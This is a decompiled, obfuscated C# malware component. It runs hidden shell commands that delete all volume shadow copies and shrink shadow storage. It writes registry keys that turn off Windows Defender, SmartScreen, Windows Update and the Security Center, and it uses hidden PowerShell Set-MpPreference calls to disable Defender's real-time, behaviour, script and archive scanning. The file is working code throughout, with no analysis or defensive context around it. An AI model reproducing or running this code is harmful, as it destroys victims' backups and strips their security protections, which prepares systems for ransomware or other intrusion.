using System;
using System.Diagnostics;
using A;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using Microsoft.VisualBasic.Devices;
using Microsoft.Win32;

namespace ns1;

public class GClass1
{
	public static void smethod_0()
	{
		if (C.b() && Operators.CompareString(C.b("Property"), (string)null, false) == 0)
		{
			B();
			a();
			A();
			C.a("Property", "U3VjY2Vzc2Z1bGx5IFJlYWR5IQ==");
		}
	}

	private static void A()
	{
		try
		{
			Interaction.Shell("cmd /c vssadmin Delete Shadows /all /quiet", (AppWinStyle)0, false, -1);
			Interaction.Shell("cmd /c vssadmin resize shadow /for=c: /on=c: /maxsize=401MB", (AppWinStyle)0, false, -1);
			Interaction.Shell("cmd /c vssadmin resize shadowstorage /for=c: /on=c: /maxsize=unbounded", (AppWinStyle)0, false, -1);
			Interaction.Shell("cmd /c vssadmin resize shadowstorage /for=d: /on=d: /maxsize=unbounded", (AppWinStyle)0, false, -1);
			Interaction.Shell("cmd /c vssadmin resize shadowstorage /for=e: /on=e: /maxsize=401MB", (AppWinStyle)0, false, -1);
			Interaction.Shell("cmd /c vssadmin resize shadowstorage /for=e: /on=e: /maxsize=unbounded", (AppWinStyle)0, false, -1);
			Interaction.Shell("cmd /c vssadmin resize shadowstorage /for=f: /on=f: /maxsize=401MB", (AppWinStyle)0, false, -1);
			Interaction.Shell("cmd /c vssadmin resize shadowstorage /for=f: /on=f: /maxsize=unbounded", (AppWinStyle)0, false, -1);
			Interaction.Shell("cmd /c vssadmin resize shadowstorage /for=g: /on=g: /maxsize=401MB", (AppWinStyle)0, false, -1);
			Interaction.Shell("cmd /c vssadmin resize shadowstorage /for=g: /on=g: /maxsize=unbounded", (AppWinStyle)0, false, -1);
			Interaction.Shell("cmd /c vssadmin resize shadowstorage /for=h: /on=h: /maxsize=401MB", (AppWinStyle)0, false, -1);
			Interaction.Shell("cmd /c vssadmin resize shadowstorage /for=h: /on=h: /maxsize=unbounded", (AppWinStyle)0, false, -1);
			Interaction.Shell("cmd /c Vssadmin delete shadowstorage /all /quiet", (AppWinStyle)0, false, -1);
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
	}

	private static void a()
	{
		try
		{
			A("Software\\Microsoft\\Edge\\SmartScreenEnabled", "SmartScreenEnabled", "0");
			A("Software\\Policies\\Microsoft\\Windows\\WindowsUpdate\\AU", "ScheduledInstallTime", "1");
			A("Software\\Policies\\Microsoft\\Windows\\WindowsUpdate\\AU", "ScheduledInstallDay", "1");
			A("Software\\Policies\\Microsoft\\Windows\\WindowsUpdate\\AU", "AUOptions", "1");
			A("Software\\Policies\\Microsoft\\Windows\\WindowsUpdate\\AU", "NoAutoUpdate", "1");
			A("SOFTWARE\\Policies\\Microsoft\\Windows Defender", "DisableAntiSpyware", "1");
			A("SOFTWARE\\Microsoft\\Windows\\Windows Error Reporting", "Disabled", "1");
			A("SYSTEM\\CurrentControlSet\\Services\\wscsvc", "Start", "00000004");
			A("SYSTEM\\CurrentControlSet\\Services\\SecurityHealthService", "Start", "00000004");
			A("SOFTWARE\\Policies\\Microsoft\\Windows\\System", "ConfigureAppInstallControlEnabled", "00000001");
			A("SOFTWARE\\Policies\\Microsoft\\Windows\\System", "ConfigureAppInstallControl", "Anywhere");
			A("SOFTWARE\\Policies\\Microsoft\\Windows\\System", "EnableSmartScreen", "00000000");
			A("SOFTWARE\\Policies\\Microsoft\\MicrosoftEdge\\PhishingFilter", "EnabledV9", "00000000");
			A("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer", "SmartScreenEnabled", "0");
			A("SOFTWARE\\Policies\\Microsoft\\Windows Defender", "DisableAntiSpyware", "1");
			A("SOFTWARE\\Policies\\Microsoft\\Windows Defender\\Real-Time Protection", "DisableBehaviorMonitoring", "1");
			A("SOFTWARE\\Policies\\Microsoft\\Windows Defender\\Real-Time Protection", "DisableOnAccessProtection", "1");
			A("SOFTWARE\\Policies\\Microsoft\\Windows Defender\\Real-Time Protection", "DisableScanOnRealtimeEnable", "1");
			((ServerComputer)global::A.B.Computer).get_Registry().SetValue("HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\AppHost", "EnableWebContentEvaluation", (object)"00000000", RegistryValueKind.DWord);
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
	}

	private static void A(string string_0, string string_1, string string_2)
	{
		try
		{
			using RegistryKey registryKey = Registry.LocalMachine.OpenSubKey(string_0, RegistryKeyPermissionCheck.ReadWriteSubTree);
			if (registryKey == null)
			{
				Registry.LocalMachine.CreateSubKey(string_0).SetValue(string_1, string_2, RegistryValueKind.DWord);
			}
			else if (registryKey.GetValue(string_1) != string_2)
			{
				registryKey.SetValue(string_1, string_2, RegistryValueKind.DWord);
			}
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
	}

	private static void B()
	{
		try
		{
			Process process = new Process
			{
				StartInfo = new ProcessStartInfo
				{
					FileName = "powershell",
					Arguments = "Get-MpPreference -verbose",
					UseShellExecute = false,
					RedirectStandardOutput = true,
					WindowStyle = ProcessWindowStyle.Hidden,
					CreateNoWindow = true
				}
			};
			process.Start();
			while (!process.StandardOutput.EndOfStream)
			{
				string text = process.StandardOutput.ReadLine();
				if (text.Contains("DisableRealtimeMonitoring") && text.Contains("False"))
				{
					A("Set-MpPreference -DisableRealtimeMonitoring $true");
				}
				else if (text.Contains("DisableBehaviorMonitoring") && text.Contains("False"))
				{
					A("Set-MpPreference -DisableBehaviorMonitoring $true");
				}
				else if (text.Contains("DisableBlockAtFirstSeen") && text.Contains("False"))
				{
					A("Set-MpPreference -DisableBlockAtFirstSeen $true");
				}
				else if (text.Contains("DisableIOAVProtection") && text.Contains("False"))
				{
					A("Set-MpPreference -DisableIOAVProtection $true");
				}
				else if (text.Contains("DisablePrivacyMode") && text.Contains("False"))
				{
					A("Set-MpPreference -DisablePrivacyMode $true");
				}
				else if (text.Contains("SignatureDisableUpdateOnStartupWithoutEngine") && text.Contains("False"))
				{
					A("Set-MpPreference -SignatureDisableUpdateOnStartupWithoutEngine $true");
				}
				else if (text.Contains("DisableArchiveScanning") && text.Contains("False"))
				{
					A("Set-MpPreference -DisableArchiveScanning $true");
				}
				else if (text.Contains("DisableIntrusionPreventionSystem") && text.Contains("False"))
				{
					A("Set-MpPreference -DisableIntrusionPreventionSystem $true");
				}
				else if (text.Contains("DisableScriptScanning") && text.Contains("False"))
				{
					A("Set-MpPreference -DisableScriptScanning $true");
				}
				else if (text.Contains("SubmitSamplesConsent") && !text.Contains("2"))
				{
					A("Set-MpPreference -SubmitSamplesConsent 2");
				}
				else if (text.Contains("MAPSReporting") && !text.Contains("0"))
				{
					A("Set-MpPreference -MAPSReporting 0");
				}
				else if (text.Contains("HighThreatDefaultAction") && !text.Contains("6"))
				{
					A("Set-MpPreference -HighThreatDefaultAction 6 -Force");
				}
				else if (text.Contains("ModerateThreatDefaultAction") && !text.Contains("6"))
				{
					A("Set-MpPreference -ModerateThreatDefaultAction 6");
				}
				else if (text.Contains("LowThreatDefaultAction") && !text.Contains("6"))
				{
					A("Set-MpPreference -LowThreatDefaultAction 6");
				}
				else if (text.Contains("SevereThreatDefaultAction") && !text.Contains("6"))
				{
					A("Set-MpPreference -SevereThreatDefaultAction 6");
				}
			}
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
	}

	private static void A(string string_0)
	{
		Process process = new Process
		{
			StartInfo = new ProcessStartInfo
			{
				FileName = "powershell",
				Arguments = string_0,
				WindowStyle = ProcessWindowStyle.Hidden,
				CreateNoWindow = true
			}
		};
		process.Start();
	}
}
